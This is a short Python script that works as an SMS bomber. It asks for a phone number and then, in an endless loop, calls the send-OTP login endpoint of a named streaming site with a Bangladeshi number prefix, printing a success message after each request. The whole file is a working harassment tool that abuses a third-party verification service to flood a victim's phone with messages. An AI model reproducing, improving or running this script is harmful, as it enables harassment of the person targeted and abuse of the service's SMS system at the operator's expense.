import mechanize
phon = input('Enter phone number : ')
br = mechanize.Browser()
while True:
	br.open(f'https://www.bioscopelive.com/en/login/send-otp?phone=880{phon}&operator=bd-otp')
	print('SMS sent succesfully...')